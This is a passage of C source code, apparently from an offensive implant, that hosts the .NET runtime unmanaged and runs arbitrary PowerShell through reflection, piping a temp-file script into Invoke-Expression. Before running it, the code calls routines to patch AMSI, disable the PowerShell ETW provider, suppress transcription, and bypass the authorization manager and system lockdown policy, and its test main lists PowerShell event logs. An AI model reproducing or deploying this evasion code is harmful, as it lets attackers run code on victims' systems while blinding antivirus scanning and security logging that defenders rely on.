    hr = pAutomationAssembly->lpVtbl->GetType_2(pAutomationAssembly, bstrRunspaceConfigurationFullName, &pRunspaceConfigurationType);
    if (FAILED(hr)) {
        LOG_ERROR("pAutomationAssembly->GetType_2", hr);
        goto CLEANUP;
    }

    hr = pRunspaceConfigurationType->lpVtbl->GetMethods(pRunspaceConfigurationType, BindingFlags_Static | BindingFlags_Public, &pRunspaceConfigurationMethods);
    if (FAILED(hr)) {
        LOG_ERROR("pRunspaceConfigurationType->GetMethods", hr);
        goto CLEANUP;
    }

    pCreateMethodInfo = FindMethodInArray(pRunspaceConfigurationMethods, L"Create", 0);
    if (pCreateMethodInfo == NULL) {
        goto CLEANUP;
    }

    hr = pCreateMethodInfo->lpVtbl->Invoke_3(pCreateMethodInfo, vtEmpty, NULL, &vtResult);
    if (FAILED(hr)) {
        LOG_ERROR("pCreateMethodInfo->Invoke_3", hr);
        goto CLEANUP;
    }

    memcpy(pvtRunspaceConfiguration, &vtResult, sizeof(vtResult));
    bResult = TRUE;
CLEANUP:
    if (bstrRunspaceConfigurationFullName) {
        SysFreeString(bstrRunspaceConfigurationFullName);
    }

    if (pRunspaceConfigurationMethods) {
        SafeArrayDestroy(pRunspaceConfigurationMethods);
    }

    if (pRunspaceConfigurationType) {
        pRunspaceConfigurationType->lpVtbl->Release(pRunspaceConfigurationType);
    }

    if (pAutomationAssembly) {
        pAutomationAssembly->lpVtbl->Release(pAutomationAssembly);
    }

    return bResult;
}

LPWSTR StartPowerShell
(
    _In_ struct _AppDomain* pAppDomain,
    _In_ LPWSTR lpScript
)
{
    LPWSTR lpResult = NULL;
    DWORD dwArgumentIndex = 0;
    HRESULT hr = S_OK;
    BSTR bstrConsoleShellFullName = SysAllocString(L"System.Management.Automation.PowerShell");
    VARIANT vtEmpty;
    VARIANT vtResult;
    VARIANT vtPowerShell;
    VARIANT vtEnumValue;
    VARIANT vtScript;
    SAFEARRAY* pPowerShellMethods = NULL;
    SAFEARRAY* pAddScriptArguments = NULL;
    struct _Assembly* pAutomationAssembly = NULL;
    struct _Type* pPowerShellType = NULL;
    struct _MethodInfo* pCreateMethodInfo = NULL;
    struct _MethodInfo* pAddScriptMethodInfo = NULL;
    struct _MethodInfo* pInvokeMethodInfo = NULL;
    struct _ICollection* CollectionPsObjects = NULL;
    LPVOID lpTemp = NULL;
    IID IID_IEnumerable = { 0x496b0abe, 0xcdee, 0x11d3, {0x88, 0xe8, 0x00, 0x90, 0x27, 0x54, 0xc4, 0x3a} };
    IID IID_IObject = { 0x65074f7f, 0x63c0, 0x304e, {0xaf, 0x0a, 0xd5, 0x17, 0x41, 0xcb, 0x4a, 0x8d} };
    struct _IEnumerable* pIEnumerable = NULL;
    struct IEnumVARIANT* pIEnumVARIANT = NULL;
    ULONG uCeltFetched = 0;
    IUnknown* pPsObject = NULL;
    struct _IObject* pPureObject = NULL;
    BSTR bstrResult = NULL;

    SecureZeroMemory(&vtEmpty, sizeof(vtEmpty));
    SecureZeroMemory(&vtResult, sizeof(vtResult));
    SecureZeroMemory(&vtScript, sizeof(vtScript));
    SecureZeroMemory(&vtPowerShell, sizeof(vtPowerShell));
    SecureZeroMemory(&vtEnumValue, sizeof(vtEnumValue));
    pAutomationAssembly = LoadAssembly(pAppDomain, L"System.Management.Automation");
    if (pAutomationAssembly == NULL) {
        goto CLEANUP;
    }

    hr = pAutomationAssembly->lpVtbl->GetType_2(pAutomationAssembly, bstrConsoleShellFullName, &pPowerShellType);
    if (FAILED(hr)) {
        LOG_ERROR("pAutomationAssembly->GetType_2", hr);
        goto CLEANUP;
    }

    hr = pPowerShellType->lpVtbl->GetMethods_2(pPowerShellType, &pPowerShellMethods);
    if (FAILED(hr)) {
        LOG_ERROR("pPowerShellType->GetMethods", hr);
        goto CLEANUP;
    }

    pCreateMethodInfo = FindMethodInArray(pPowerShellMethods, L"Create", 0);
    if (pCreateMethodInfo == NULL) {
        goto CLEANUP;
    }

    hr = pCreateMethodInfo->lpVtbl->Invoke_3(pCreateMethodInfo, vtEmpty, NULL, &vtPowerShell);
    if (FAILED(hr)) {
        LOG_ERROR("pCreateMethodInfo->Invoke_3", hr);
        goto CLEANUP;
    }

    pAddScriptMethodInfo = FindMethodInArray(pPowerShellMethods, L"AddScript", 1);
    if (pAddScriptMethodInfo == NULL) {
        goto CLEANUP;
    }

    pInvokeMethodInfo = FindMethodInArray(pPowerShellMethods, L"Invoke", 0);
    if (pInvokeMethodInfo == NULL) {
        goto CLEANUP;
    }

    pAddScriptArguments = SafeArrayCreateVector(VT_VARIANT, 0, 1);
    dwArgumentIndex = 0;
    vtScript.vt = VT_BSTR;
    vtScript.bstrVal = SysAllocString(lpScript);
    SafeArrayPutElement(pAddScriptArguments, &dwArgumentIndex, &vtScript);
    hr = pAddScriptMethodInfo->lpVtbl->Invoke_3(pAddScriptMethodInfo, vtPowerShell, pAddScriptArguments, &vtResult);
    if (FAILED(hr)) {
        LOG_ERROR("pAddScriptMethodInfo->Invoke_3", hr);
        goto CLEANUP;
    }

    VariantClear(&vtResult);
    SecureZeroMemory(&vtResult, sizeof(vtResult));
    hr = pInvokeMethodInfo->lpVtbl->Invoke_3(pInvokeMethodInfo, vtPowerShell, NULL, &vtResult);
    if (FAILED(hr)) {
        LOG_ERROR("pInvokeMethodInfo->Invoke_3", hr);
        goto CLEANUP;
    }

    CollectionPsObjects = (struct _ICollection*)vtResult.punkVal;
    hr = CollectionPsObjects->lpVtbl->QueryInterface(CollectionPsObjects, &IID_IEnumerable, &pIEnumerable);
    if (FAILED(hr)) {
        LOG_ERROR("CollectionPsObjects->QueryInterface", hr);
        goto CLEANUP;
    }

    hr = pIEnumerable->lpVtbl->GetEnumerator(pIEnumerable, &pIEnumVARIANT);
    if (FAILED(hr)) {
        LOG_ERROR("pIEnumerable->GetEnumerator", hr);
        goto CLEANUP;
    }

    while (pIEnumVARIANT->lpVtbl->Next(pIEnumVARIANT, 1, &vtEnumValue, &uCeltFetched) == S_OK) {
        pPsObject = vtEnumValue.punkVal;
        pPsObject->lpVtbl->QueryInterface(pPsObject, &IID_IObject, &pPureObject);
        pPureObject->lpVtbl->get_ToString(pPureObject, &bstrResult);
        lpResult = StrCatExW(lpResult, L"\n");
        lpResult = StrCatExW(lpResult, bstrResult);
        pPureObject->lpVtbl->Release(pPureObject);
        pPsObject->lpVtbl->Release(pPsObject);
        VariantClear(&vtEnumValue);
    }

CLEANUP:
    SysFreeString(bstrConsoleShellFullName);
    if (pAddScriptArguments) {
        SafeArrayDestroy(pAddScriptArguments);
    }

    VariantClear(&vtPowerShell);
    VariantClear(&vtScript);
    VariantClear(&vtResult);
    if (pPowerShellMethods) {
        SafeArrayDestroy(pPowerShellMethods);
    }

    if (pCreateMethodInfo != NULL) {
        pCreateMethodInfo->lpVtbl->Release(pCreateMethodInfo);
    }

    if (pAddScriptMethodInfo != NULL) {
        pAddScriptMethodInfo->lpVtbl->Release(pAddScriptMethodInfo);
    }

    if (pInvokeMethodInfo != NULL) {
        pInvokeMethodInfo->lpVtbl->Release(pInvokeMethodInfo);
    }

    if (pIEnumVARIANT != NULL) {
        pIEnumVARIANT->lpVtbl->Release(pIEnumVARIANT);
    }

    if (pIEnumerable != NULL) {
        pIEnumerable->lpVtbl->Release(pIEnumerable);
    }

    if (CollectionPsObjects != NULL) {
        CollectionPsObjects->lpVtbl->Release(CollectionPsObjects);
    }

    if (pPowerShellType != NULL) {
        pPowerShellType->lpVtbl->Release(pPowerShellType);
    }
    if (pAutomationAssembly != NULL) {
        pAutomationAssembly->lpVtbl->Release(pAutomationAssembly);
    }

    return lpResult;
}

LPSTR ExecuteScript
(
    _In_ LPSTR lpCommand
)
{
    struct _AppDomain* pAppDomain = NULL;
    LPVOID* UnmarshaledData = NULL;
    DWORD i = 0;
    LPSTR lpResult = NULL;
    BOOL IsLoadedBefore = FALSE;
    LPWSTR lpTemp = NULL;
    DWORD cchOutput = 0;
    LPWSTR lpTempPath = NULL;
    WCHAR wszFullCommand[0x400];

    lpTempPath = GenerateTempPathW(NULL, L".txt", NULL);
    WriteToFile(lpTempPath, lpCommand, lstrlenA(lpCommand));
    wsprintfW(wszFullCommand, L"Get-Content %s | Invoke-Expression | Out-String", lpTempPath);
    pAppDomain = InitializeCommonLanguageRuntime(L"UevApp", &IsLoadedBefore);
    if (pAppDomain == NULL) {
        goto CLEANUP;
    }

    if (!IsLoadedBefore) {
        if (!PatchAmsiOpenSession()) {
            goto CLEANUP;
        }

        if (!DisablePowerShellEtwProvider(pAppDomain)) {
            goto CLEANUP;
        }

        if (!PatchTranscriptionOptionFlushContentToDisk(pAppDomain)) {
            goto CLEANUP;
        }

        if (!PatchAuthorizationManagerShouldRunInternal(pAppDomain)) {
            goto CLEANUP;
        }

        if (!PatchSystemPolicyGetSystemLockdownPolicy(pAppDomain)) {
            goto CLEANUP;
        }
    }

    lpTemp = StartPowerShell(pAppDomain, wszFullCommand);
    if (lpTemp == NULL) {
        goto CLEANUP;
    }

    lpResult = ConvertWcharToChar(lpTemp);
CLEANUP:
    if (lpTempPath != NULL) {
        DeleteFileW(lpTempPath);
        FREE(lpTempPath);
    }

    FREE(lpTemp);
    if (pAppDomain != NULL) {
        pAppDomain->lpVtbl->Release(pAppDomain);
    }

    return lpResult;
}

LONG VectoredExceptionHandler
(
    _In_ PEXCEPTION_POINTERS ExceptionInfo
)
{
    DWORD dwExceptionCode = ExceptionInfo->ExceptionRecord->ExceptionCode;

    if (dwExceptionCode == 0xe0434352 || dwExceptionCode == 0x4242420) {
        return EXCEPTION_CONTINUE_SEARCH;
    }
    
    wprintf(L"Exception code: 0x%08x\n", dwExceptionCode);
    ExitProcess(-1);
}

int main() {
    RtlAddVectoredExceptionHandler(1, VectoredExceptionHandler);
    LPSTR lpResult = ExecuteScript("cd C:\\Windows\\System32\\winevt\\Logs ; ls -File | where { $_.Name -ilike \"*powershell*\"}");
    if (lpResult != NULL) {
        printf("%s\n", lpResult);
        FREE(lpResult);
    }

    return 0;
}